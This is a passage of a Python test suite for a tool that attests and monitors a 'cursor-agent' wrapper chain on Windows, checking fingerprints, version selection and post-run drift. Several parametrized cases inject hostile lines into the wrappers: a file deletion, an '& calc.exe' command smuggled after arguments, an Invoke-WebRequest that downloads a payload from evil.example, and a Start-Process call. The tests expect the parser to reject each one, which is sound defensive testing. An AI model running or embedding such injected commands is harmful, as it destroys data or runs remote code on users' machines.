    '%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%\\cursor-agent.ps1" %*\r\n'
)
_OBSERVED_PS_WRAPPER = "## Locally observed Anysphere launcher\r\n" + "\r\n".join(_POWERSHELL_WRAPPER_TEMPLATE_LINES) + "\r\n"


def _wrapper_chain_installation(tmp_path: Path, *, versions: tuple[str, ...] = ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0"), manifest_name: str = EXPECTED_CURSOR_PACKAGE_NAME) -> Path:
    root = tmp_path / "wrapper-install"; root.mkdir()
    (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    (root / "cursor-agent.ps1").write_bytes(_OBSERVED_PS_WRAPPER.encode("utf-8"))
    for name in versions:
        version = root / "versions" / name; version.mkdir(parents=True)
        shutil.copy2(Path(sys.executable).resolve(), version / "node.exe")
        (version / "index.js").write_text("// deterministic fake cursor entry\n", encoding="utf-8")
        (version / "package.json").write_text(json.dumps({"name": manifest_name}), encoding="utf-8")
        (version / "cursor-agent.cmd").write_bytes((root / "cursor-agent.cmd").read_bytes())
        (version / "cursor-agent.ps1").write_bytes((root / "cursor-agent.ps1").read_bytes())
    return root


@dataclass
class FakeWrapperChainDiscovery:
    """Explicit test-only discovery seam; unreachable from the production CLI."""

    root: Path
    which: str | None = None
    which_unavailable: bool = False
    where: tuple[str, ...] | None = None
    powershell: tuple[str, ...] | None = None
    powershell_records: tuple[tuple[str, str, str], ...] | None = None
    powershell_preferred: tuple[str, str, str] | None = None
    path: str | None = None
    pathext: str = ".COM;.EXE;.BAT;.CMD"
    where_exit_code: int = 0
    where_stdout: bytes | None = None
    where_stderr: bytes = b""
    where_unavailable: bool = False
    where_execution_error: bool = False

    def which_cursor_agent(self, *, path_value: str, pathext_value: str) -> str | None:
        if self.which_unavailable:
            return None
        return self.which if self.which is not None else str(self.root / "cursor-agent.cmd")

    def where_cursor_agent(self) -> WhereCommandObservation:
        if self.where_unavailable:
            return WhereCommandObservation(None, ("where.exe", "cursor-agent"), None, b"", b"")
        executable = str(Path(sys.executable).resolve())
        paths = self.where if self.where is not None else (str(self.root / "cursor-agent.cmd"),)
        stdout = self.where_stdout if self.where_stdout is not None else (
            "".join(f"{item}\r\n" for item in paths).encode("utf-8")
        )
        return WhereCommandObservation(
            executable, (executable, "cursor-agent"),
            None if self.where_execution_error else self.where_exit_code,
            stdout, self.where_stderr, self.where_execution_error,
        )

    def powershell_cursor_agent(self) -> PowerShellCommandObservation | None:
        if self.powershell_records is not None:
            rows = self.powershell_records
        else:
            paths = self.powershell if self.powershell is not None else (
                str(self.root / "cursor-agent.ps1"), str(self.root / "cursor-agent.cmd"),
            )
            rows = tuple(
                ("ExternalScript" if Path(item).suffix.casefold() == ".ps1" else "Application", Path(item).name, item)
                for item in paths
            )
        preferred = self.powershell_preferred
        if preferred is None:
            preferred = next((item for item in rows if Path(item[2]).suffix.casefold() == ".ps1"), rows[0] if rows else None)
        return PowerShellCommandObservation(rows, preferred)

    def path_value(self) -> str: return self.path if self.path is not None else str(self.root) + ";" + "C:\\Windows"
    def pathext_value(self) -> str: return self.pathext
    def node_signature_context(self, node_path: Path) -> str: return "NotSigned|test-context"


_WRAPPER_CONFIG = CursorNativeBackendConfig(executable="cursor-agent", attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)


def _wrapper_attestation(tmp_path: Path) -> tuple[Path, FakeWrapperChainDiscovery, WrapperChainBackendAttestation]:
    root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(root)
    return root, discovery, _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)


def test_wrapper_chain_positive_recognizes_observed_grammar_and_selects_latest(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    assert attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert attestation.version_inventory == ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0")
    assert attestation.selected_version == "2026.07.09-a3815c0"
    selected = root / "versions" / "2026.07.09-a3815c0"
    assert Path(attestation.executable.canonical_path) == selected / "node.exe"
    assert Path(attestation.launcher_prefix[0].canonical_path) == selected / "index.js"
    assert attestation.cmd_semantics["adjacent_powershell_target"] == "cursor-agent.ps1"
    assert attestation.powershell_semantics["executes"] == "selected-version node.exe index.js"
    assert dict(attestation.claims) == WRAPPER_CHAIN_CLAIMS and attestation.claims["publisher_provenance_established"] is False
    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
    assert attestation.manifest_declares_cursor_agent_bin is False
    reloaded = attestation_from_dict(json.loads(json.dumps(attestation.to_dict())))
    assert isinstance(reloaded, WrapperChainBackendAttestation) and reloaded == attestation
    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery) == attestation


def test_wrapper_chain_requires_explicit_class_and_rejects_caller_supplied_roots(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="explicitly configured"):
        _attest_wrapper_chain_cursor(CursorNativeBackendConfig(executable="cursor-agent"), discovery=FakeWrapperChainDiscovery(root))
    with pytest.raises(ValueError, match="bare canonical"):
        CursorNativeBackendConfig(executable=str(root / "cursor-agent.cmd"), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
    with pytest.raises(ValueError, match="bare canonical"):
        CursorNativeBackendConfig(executable="cursor-agent", launcher_prefix=(str(root / "cursor-agent.ps1"),), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
    # A failed package-bin attestation raises; it never downgrades in place.
    with pytest.raises(ValueError):
        _attest_local_backend(CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()), launcher_prefix=(str(root / "cursor-agent.ps1"),)))


def test_production_wrapper_chain_surface_has_no_injection_seam():
    import inspect
    from admissible.delegated_gate.native_canary import build_parser as production_parser
    assert set(inspect.signature(_preflight).parameters) == {"config", "work_workspace"}
    options = {option for action in production_parser()._actions for option in action.option_strings}
    assert not any("discovery" in option or "attestation-file" in option for option in options)


@pytest.mark.parametrize("mutate", [
    lambda text: text + "del /q important.txt\r\n",
    lambda text: text.replace("cursor-agent.ps1", "other.ps1"),
    lambda text: text.replace(" %*", " %* --force"),
    lambda text: text.replace("%*\r\n", "%* & calc.exe\r\n"),
    lambda text: text.replace('"%SCRIPT_DIR%\\cursor-agent.ps1"', '"C:\\Temp\\cursor-agent.ps1"'),
    lambda text: text.replace("-NoProfile ", ""),
    lambda text: text.replace('set "SCRIPT_DIR=%~dp0"', 'cd /d C:\\ \r\nset "SCRIPT_DIR=%~dp0"'),
])
def test_cmd_wrapper_parser_rejects_non_audited_semantics(mutate):
    with pytest.raises(ValueError):
        _parse_cmd_wrapper(mutate(_OBSERVED_CMD_WRAPPER).encode("ascii"), wrapper_name="cursor-agent.cmd")


@pytest.mark.parametrize("mutate", [
    lambda text: text + "Invoke-WebRequest https://evil.example/payload -OutFile $scriptPath\\update.ps1\r\n",
    lambda text: text.replace("$args\r\n", "$args --force\r\n"),
    lambda text: text.replace('"$scriptPath\\versions"', '"$env:TEMP\\versions"'),
    lambda text: text.replace("'^\\d{4}", "'^\\d{2}"),
    lambda text: text.replace("Select-Object -First 1", "Select-Object -Last 1"),
    lambda text: text + '@"\r\nhidden\r\n"@\r\n',
    lambda text: text.replace("exit $LASTEXITCODE\r\n", "exit $LASTEXITCODE\r\nStart-Process installer.exe\r\n"),
])
def test_powershell_wrapper_recognizer_fails_closed(mutate):
    with pytest.raises(ValueError):
        _parse_powershell_wrapper(mutate(_OBSERVED_PS_WRAPPER).encode("utf-8"))


def test_contradictory_or_out_of_root_command_resolution_blocks(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    (elsewhere / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    base = FakeWrapperChainDiscovery(root)
    for discovery in (
        FakeWrapperChainDiscovery(root, which=str(elsewhere / "cursor-agent.cmd")),
        FakeWrapperChainDiscovery(root, where=(str(elsewhere / "cursor-agent.cmd"), str(root / "cursor-agent.cmd"))),
        FakeWrapperChainDiscovery(root, where=(str(root / "cursor-agent.cmd"), str(elsewhere / "cursor-agent.cmd"))),
        FakeWrapperChainDiscovery(root, powershell=(str(elsewhere / "cursor-agent.cmd"),)),
        FakeWrapperChainDiscovery(root, path="C:\\Windows"),
        FakeWrapperChainDiscovery(root, pathext=".COM;.EXE;.BAT"),
        FakeWrapperChainDiscovery(root, which=""),
    ):
        with pytest.raises(ValueError):
            _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=base) is not None


def test_changed_path_fingerprint_produces_a_different_attestation(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    reordered = FakeWrapperChainDiscovery(root, path="C:\\Windows" + os.pathsep + str(root))
    other = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=reordered)
    assert other.attestation_fingerprint != attestation.attestation_fingerprint


def test_version_tie_ambiguity_and_grammar_mismatch_block(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path, versions=("2026.07.09-a3815c0", "2026.7.9-bbbbbbb"))
    with pytest.raises(ValueError, match="ambiguous"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))
    (tmp_path / "bad").mkdir()
    bad = _wrapper_chain_installation(tmp_path / "bad", versions=("not-a-version",))
    with pytest.raises(ValueError, match="grammar"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(bad))


def test_junction_or_symlink_version_directory_is_refused(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    target = tmp_path / "redirect-target"; target.mkdir()
    link = root / "versions" / "2026.08.01-cafecafe"
    if os.name == "nt":
        completed = subprocess.run(["cmd.exe", "/d", "/c", "mklink", "/J", str(link), str(target)], shell=False, capture_output=True)
        if completed.returncode != 0: pytest.skip("junction creation unavailable")
    else:
        try: os.symlink(target, link, target_is_directory=True)
        except (OSError, NotImplementedError): pytest.skip("symlinks unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))


@pytest.mark.parametrize("mutate", [
    lambda root, selected: (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.replace(" %*", " %* --trust").encode("ascii")),
    lambda root, selected: (root / "cursor-agent.ps1").write_bytes((_OBSERVED_PS_WRAPPER + "Copy-Item a b\r\n").encode("utf-8")),
    lambda root, selected: (selected / "cursor-agent.ps1").write_bytes(b"# hollowed\r\n" + (root / "cursor-agent.ps1").read_bytes()),
    lambda root, selected: (selected / "index.js").write_text("// substituted entry\n", encoding="utf-8"),
    lambda root, selected: (selected / "node.exe").write_bytes((selected / "node.exe").read_bytes() + b"x"),
    lambda root, selected: (selected / "package.json").write_text(json.dumps({"name": "impostor-package"}), encoding="utf-8"),
    lambda root, selected: (root / "versions" / "2026.08.01-cafecafe").mkdir(),
    lambda root, selected: shutil.copy2(selected / "node.exe", root / "node.exe"),
])
def test_any_authoritative_change_after_attestation_fails_revalidation_and_blocks_spawn(tmp_path: Path, mutate):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    selected = root / "versions" / attestation.selected_version
    mutate(root, selected)
    with pytest.raises(ValueError):
        attestation.validated()


def test_substituted_wrapper_chain_attestation_with_recomputed_fingerprints_is_rejected(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    raw = attestation.to_dict()
    raw["selected_version"] = "2026.06.15-18-00-12-6f5a2cf"
    raw["attestation_fingerprint"] = fingerprint({key: value for key, value in raw.items() if key != "attestation_fingerprint"})
    with pytest.raises(ValueError):
        attestation_from_dict(raw)
    lying = attestation.to_dict()
    lying["claims"] = {**lying["claims"], "publisher_provenance_established": True}
    lying["attestation_fingerprint"] = fingerprint({key: value for key, value in lying.items() if key != "attestation_fingerprint"})
    with pytest.raises(ValueError, match="claim"):
        attestation_from_dict(lying)


def _wrapper_chain_harness(tmp_path: Path) -> tuple[Harness, FakeWrapperChainDiscovery]:
    source_parent = tmp_path / "source-parent"; source_parent.mkdir(); source = build_canary_repository(source_parent, repository_name="source").repository
    root = tmp_path / "run"; root.mkdir(); work = build_canary_repository(root).repository; evidence = root / "evidence"; evidence.mkdir()
    install_root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(install_root)
    attestor = lambda config: _attest_wrapper_chain_cursor(config, discovery=discovery)
    attestation = attestor(_WRAPPER_CONFIG)
    fake = FakeNativeProcessRunner(); store = AtomicNativeExecutionStore(evidence / "native-execution"); session_store = AtomicDelegatedSessionStore(evidence / "delegated-state")
    session_id = "wrapper-chain-session"; session_store.create(create_canary_session(session_id=session_id))
    executor = NativeDelegatedExecutor(config=_WRAPPER_CONFIG, process_runner=fake, clock=Clock(), local_attestor=attestor)
    coordinator = NativeCanaryCoordinator(session_store=session_store, execution_store=store, executor=executor, backend_attestation=attestation, source_repository=source, work_workspace=work, canary_parent=root, evidence_directory=evidence, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
    return Harness(root, source, work, evidence, _WRAPPER_CONFIG, attestation, fake, store, session_store, executor, coordinator, session_id), discovery


def test_wrapper_chain_attestation_round_trips_through_request_execution_and_reconstruction(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    first = h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    second = h.coordinator.run(session_id=h.session_id)
    assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and len(h.runner.invocations) == 1
    request = h.store.load_request(h.session_id, "native-canary-gate", 0)
    assert isinstance(request.backend_attestation, WrapperChainBackendAttestation)
    assert request.backend_attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    argv = h.runner.invocations[0].argv
    assert argv[0] == h.attestation.executable.canonical_path and argv[1] == h.attestation.launcher_prefix[0].canonical_path


@pytest.mark.parametrize("drift_kind",["wrapper_metadata","wrapper_content","catalog","pinned_content","pinned_launcher_content","pinned_identity"])
def test_post_spawn_backend_drift_preserves_observation_but_blocks_downstream(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, drift_kind: str):
    h,_=_wrapper_chain_harness(tmp_path)
    root=Path(h.attestation.command_resolution.wrapper_root); executable=Path(h.attestation.executable.canonical_path)
    def mutate() -> None:
        if drift_kind=="wrapper_metadata":
            target=root/"cursor-agent.cmd"; metadata=os.stat(target); os.utime(target,ns=(metadata.st_atime_ns,metadata.st_mtime_ns+10_000_000))
        elif drift_kind=="wrapper_content":
            target=root/"cursor-agent.cmd"; target.write_bytes(target.read_bytes()+b"REM drift\r\n")
        elif drift_kind=="catalog":
            (root/"versions"/"2026.08.01-cafecafe").mkdir()
        elif drift_kind=="pinned_content":
            executable.write_bytes(executable.read_bytes()+b"x")
        elif drift_kind=="pinned_launcher_content":
            launcher=Path(h.attestation.launcher_prefix[0].canonical_path); launcher.write_bytes(launcher.read_bytes()+b"// drift\n")
        else:
            replacement=executable.with_name("node.replacement"); replacement.write_bytes(executable.read_bytes()); os.replace(replacement,executable)
    h.runner.after_start=mutate
    calls={"behavioral":0,"capture":0}
    def forbidden_behavioral(**kwargs: object) -> object: calls["behavioral"]+=1; raise AssertionError("behavioral verifier must be unreachable")
    def forbidden_capture(**kwargs: object) -> object: calls["capture"]+=1; raise AssertionError("checkpoint must be unreachable")
    monkeypatch.setattr("admissible.delegated_gate.native_canary.run_behavioral_verifier",forbidden_behavioral)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",forbidden_capture)
    first=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED
    observation=h.store.load_process_observation(h.session_id,CANARY_GATE_ID,0)
    eligibility=h.store.load_execution_eligibility(h.session_id,CANARY_GATE_ID,0)
    assert observation.process_completion_observed and not eligibility.eligible
    assert "post_run_backend_drift" in eligibility.ineligibility_reasons
    assert (first.native_attempts_reserved,first.native_processes_started,first.native_processes_completed,first.process_observations_published,first.accepted_native_results_published,first.provider_invocations)==(1,1,1,1,0,1)
    assert not h.store.has_result(h.session_id,CANARY_GATE_ID,0) and not h.store.has_behavioral_evidence(h.session_id,CANARY_GATE_ID,0) and calls=={"behavioral":0,"capture":0}
    if drift_kind=="wrapper_metadata":
        assert eligibility.wrapper_chain_drift[0]=="METADATA_ONLY_DRIFT"
        assert eligibility.pinned_executable_validation=="NO_DRIFT" and eligibility.pinned_launcher_validation==("NO_DRIFT",)
    elif drift_kind=="wrapper_content": assert eligibility.wrapper_chain_drift[0]=="CONTENT_DRIFT"
    elif drift_kind=="catalog": assert eligibility.catalog_validation=="VERSION_INVENTORY_DRIFT" and eligibility.selected_version_validation=="SELECTED_VERSION_DRIFT"
    elif drift_kind=="pinned_content": assert eligibility.pinned_executable_validation=="CONTENT_DRIFT"
    elif drift_kind=="pinned_launcher_content": assert eligibility.pinned_launcher_validation==("CONTENT_DRIFT",)
    else: assert eligibility.pinned_executable_validation=="IDENTITY_ONLY_DRIFT"
    # Terminal reconstruction is structural and precedes any now-broken live
    # catalog re-attestation.
    h.executor._local_attestor=lambda _: (_ for _ in ()).throw(ValueError("live catalog unavailable"))
    second=h.coordinator.run(session_id=h.session_id)
    assert second.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED and len(h.runner.invocations)==1


def _bump_directory_mtime(path: Path) -> None:
    metadata = os.stat(path)
    os.utime(path, ns=(metadata.st_atime_ns, metadata.st_mtime_ns + 10_000_000))


def test_selected_version_directory_mtime_only_is_persisted_diagnostic_and_admits_behavioral_verification(tmp_path: Path):
    h, _ = _wrapper_chain_harness(tmp_path)
    selected = Path(h.attestation.selected_version_root)
    h.runner.after_start = lambda: _bump_directory_mtime(selected)
    outcome = h.coordinator.run(session_id=h.session_id)
    eligibility = h.store.load_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert outcome.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    assert eligibility.eligible and "post_run_backend_drift" not in eligibility.ineligibility_reasons
    assert eligibility.selected_version_validation == "METADATA_ONLY_DRIFT"
    assert "selected_version:METADATA_ONLY_DRIFT" in eligibility.backend_drift_diagnostics
    assert "selected_version:METADATA_ONLY_DRIFT:FUTURE_ATTESTATION_REFRESH_REQUIRED" in eligibility.backend_drift_diagnostics
    assert h.store.has_process_observation(h.session_id, CANARY_GATE_ID, 0)
    assert h.store.has_result(h.session_id, CANARY_GATE_ID, 0)
    binding = h.store.load_request_structural(h.session_id, CANARY_GATE_ID, 0)
    behavioral = load_behavioral_verifier(request=binding, execution_store=h.store)
    assert behavioral.exit_code == 0 and not behavioral.timed_out
    assert h.store.has_capture_attempt(h.session_id, CANARY_GATE_ID, 0)
    assert outcome.checkpoint_fingerprint is not None and len(h.runner.invocations) == 1


def test_selected_version_directory_mtime_change_before_spawn_still_blocks_exact_reattestation(tmp_path: Path):
    h, _ = _wrapper_chain_harness(tmp_path)
    request, prompt = _request(h)
    h.store.create_request(request)
    _bump_directory_mtime(Path(h.attestation.selected_version_root))
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    assert h.runner.invocations == []


def test_post_run_command_resolution_change_remains_blocking(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    earlier = tmp_path / "post-run-earlier-path"; earlier.mkdir()
    h.runner.after_start = lambda: setattr(discovery, "path", _path_value(earlier, discovery.root, "C:\\Windows"))
    request, prompt = _request(h)
    h.store.create_request(request)
    with pytest.raises(NativeResultIneligible):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    eligibility = h.store.load_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert "IDENTITY_ONLY_DRIFT" in eligibility.wrapper_chain_drift
    assert "command_resolution:IDENTITY_ONLY_DRIFT" in eligibility.backend_drift_diagnostics
    assert not eligibility.eligible and "post_run_backend_drift" in eligibility.ineligibility_reasons


def _materialize_two_commits(repository: Path) -> None:
    _materialize_success(repository)
    path = repository / "src" / "score.js"
    path.write_text(path.read_text(encoding="utf-8") + "\n// second commit\n", encoding="utf-8")
    _commit(repository, "chore: second commit")


def _materialize_wrong_message(repository: Path) -> None:
    _materialize_success(repository)
    _amend_message(repository, REQUIRED_COMMIT_MESSAGE, "forbidden body")


def _materialize_dirty_worktree(repository: Path) -> None:
    _materialize_success(repository)
    (repository / "untracked-after-commit.txt").write_text("dirty\n", encoding="utf-8")


def _materialize_missing_material_path(repository: Path) -> None:
    _materialize_success(repository)
    _command(["git", "checkout", "HEAD~1", "--", "README.md"], cwd=repository)
    _command(["git", "add", "README.md"], cwd=repository)
    _amend_message(repository, REQUIRED_COMMIT_MESSAGE)


def _add_work_remote(h: Harness) -> None:
    _command(["git", "remote", "add", "origin", "https://invalid.example/canary.git"], cwd=h.work)


def _mutate_source_during_process(h: Harness) -> None:
    original = h.runner.after_start
    assert original is not None

    def mutate() -> None:
        original()
        path = h.source / "README.md"
        path.write_text(path.read_text(encoding="utf-8") + "\nsource drift\n", encoding="utf-8")

    h.runner.after_start = mutate


@pytest.mark.parametrize(("case", "configure", "reason"), [
    ("process exit", lambda h: setattr(h.runner, "returncode", 7), "native_process_or_cleanup_ineligible"),
    ("timeout", lambda h: (setattr(h.runner, "returncode", None), setattr(h.runner, "timed_out", True)), "native_process_or_cleanup_ineligible"),
    ("cleanup", lambda h: setattr(h.runner, "cleanup_confirmed", False), "native_process_or_cleanup_ineligible"),
    ("exact commit count", lambda h: setattr(h.runner, "mutation", _materialize_two_commits), "exactly_one_new_commit_required"),
    ("complete commit message", lambda h: setattr(h.runner, "mutation", _materialize_wrong_message), "complete_commit_message_mismatch"),
    ("workspace cleanliness", lambda h: setattr(h.runner, "mutation", _materialize_dirty_worktree), "final_worktree_not_clean"),
    ("remote absence", _add_work_remote, "git_remote_present"),
    ("material paths", lambda h: setattr(h.runner, "mutation", _materialize_missing_material_path), "required_material_paths_missing"),
    ("source integrity", _mutate_source_during_process, "source_or_parent_boundary_changed"),
])
def test_selected_version_mtime_diagnostic_does_not_relax_any_other_precapture_check(tmp_path: Path, case: str, configure: Callable[[Harness], object], reason: str):
    h, _ = _wrapper_chain_harness(tmp_path)
    selected = Path(h.attestation.selected_version_root)
    h.runner.after_start = lambda: _bump_directory_mtime(selected)
    configure(h)
    request, prompt = _request(h)
    h.store.create_request(request)
    with pytest.raises(NativeResultIneligible):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    eligibility = h.store.load_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert eligibility.selected_version_validation == "METADATA_ONLY_DRIFT", case
    assert "selected_version:METADATA_ONLY_DRIFT:FUTURE_ATTESTATION_REFRESH_REQUIRED" in eligibility.backend_drift_diagnostics, case
    assert "post_run_backend_drift" not in eligibility.ineligibility_reasons, case
    assert reason in eligibility.ineligibility_reasons, case
    assert not h.store.has_result(h.session_id, CANARY_GATE_ID, 0)


def _synthetic_wrapper_chain_drift(*, executable: str = "NO_DRIFT", launcher: str = "NO_DRIFT", wrapper: str = "NO_DRIFT", package_manifest: str = "NO_DRIFT", command_resolution: str = "NO_DRIFT", catalog: str = "NO_DRIFT", selected_version: str = "NO_DRIFT") -> object:
    wrappers = (wrapper, "NO_DRIFT", package_manifest, "NO_DRIFT", "NO_DRIFT")
    diagnostics = (
        f"pinned_executable:{executable}", f"pinned_launcher_0:{launcher}",
        f"cmd_wrapper:{wrappers[0]}", f"powershell_wrapper:{wrappers[1]}",
        f"selected_package_manifest:{wrappers[2]}", f"selected_wrapper_copy_0:{wrappers[3]}",
        f"selected_wrapper_copy_1:{wrappers[4]}", f"command_resolution:{command_resolution}",
        f"version_inventory:{catalog}", f"selected_version:{selected_version}",
    )
    return native_executor._BackendDrift(
        executable, (launcher,), wrappers, command_resolution, catalog, selected_version, diagnostics,
    )


@pytest.mark.parametrize(("case", "drift"), [
    ("selected-version identical-byte identity replacement", _synthetic_wrapper_chain_drift(selected_version="IDENTITY_ONLY_DRIFT")),
    ("selected-version mode change", _synthetic_wrapper_chain_drift(selected_version="IDENTITY_ONLY_DRIFT")),
    ("selected-version Windows attribute change", _synthetic_wrapper_chain_drift(selected_version="IDENTITY_ONLY_DRIFT")),
    ("selected-version reparse change", _synthetic_wrapper_chain_drift(selected_version="IDENTITY_ONLY_DRIFT")),
    ("selected-version missing", _synthetic_wrapper_chain_drift(selected_version="MISSING")),
    ("selected-version unreadable", _synthetic_wrapper_chain_drift(selected_version="UNREADABLE")),
    ("selected-version value change", _synthetic_wrapper_chain_drift(selected_version="SELECTED_VERSION_DRIFT")),
    ("version inventory change", _synthetic_wrapper_chain_drift(catalog="VERSION_INVENTORY_DRIFT")),
    ("command-resolution change", _synthetic_wrapper_chain_drift(command_resolution="IDENTITY_ONLY_DRIFT")),
    ("node content drift", _synthetic_wrapper_chain_drift(executable="CONTENT_DRIFT")),
    ("index content drift", _synthetic_wrapper_chain_drift(launcher="CONTENT_DRIFT")),
    ("node identical-byte identity replacement", _synthetic_wrapper_chain_drift(executable="IDENTITY_ONLY_DRIFT")),
    ("wrapper content drift", _synthetic_wrapper_chain_drift(wrapper="CONTENT_DRIFT")),
    ("wrapper metadata-only drift", _synthetic_wrapper_chain_drift(wrapper="METADATA_ONLY_DRIFT")),
    ("package manifest drift", _synthetic_wrapper_chain_drift(package_manifest="CONTENT_DRIFT")),
    ("selected mtime plus wrapper content", _synthetic_wrapper_chain_drift(wrapper="CONTENT_DRIFT", selected_version="METADATA_ONLY_DRIFT")),
    ("selected mtime plus inventory", _synthetic_wrapper_chain_drift(catalog="VERSION_INVENTORY_DRIFT", selected_version="METADATA_ONLY_DRIFT")),
    ("selected mtime plus pinned identity", _synthetic_wrapper_chain_drift(executable="IDENTITY_ONLY_DRIFT", selected_version="METADATA_ONLY_DRIFT")),
])
def test_non_authorized_post_run_backend_drift_categories_remain_ineligible(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, case: str, drift: object):
    h, _ = _wrapper_chain_harness(tmp_path)
    request, prompt = _request(h)
    h.store.create_request(request)
    monkeypatch.setattr(native_executor, "_observe_backend_drift", lambda *args, **kwargs: drift)
    with pytest.raises(NativeResultIneligible):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    eligibility = h.store.load_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert not eligibility.eligible, case
    assert "post_run_backend_drift" in eligibility.ineligibility_reasons, case
    assert "selected_version:METADATA_ONLY_DRIFT:FUTURE_ATTESTATION_REFRESH_REQUIRED" not in eligibility.backend_drift_diagnostics, case
    assert h.store.has_process_observation(h.session_id, CANARY_GATE_ID, 0)
    assert not h.store.has_result(h.session_id, CANARY_GATE_ID, 0)


def test_post_spawn_structural_request_reload_is_inert_while_strict_reload_rejects_drift(tmp_path: Path):
    h,_=_wrapper_chain_harness(tmp_path); root=Path(h.attestation.command_resolution.wrapper_root)
    h.runner.after_start=lambda: (root/"versions"/"2026.08.01-cafecafe").mkdir()
    assert h.coordinator.run(session_id=h.session_id).status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED
    binding=h.store.load_request_structural(h.session_id,CANARY_GATE_ID,0)
    assert binding.request_fingerprint and not hasattr(binding,"validated_for_execution") and len(h.runner.invocations)==1
    with pytest.raises((NativeEvidenceInvalid,ValueError)):
        h.store.load_request_verified_against_local_backend(h.session_id,CANARY_GATE_ID,0,current_attestation=h.attestation)


def test_new_later_version_after_authorization_blocks_spawn_and_invalidates_payload(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
    request = NativeExecutionRequest.create(session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0, mission_fingerprint=state.mission.mission_fingerprint, gate_contract_fingerprint=state.current_gate.contract_fingerprint, work_workspace=h.work, evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory, attestation=h.attestation, prompt=prompt, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
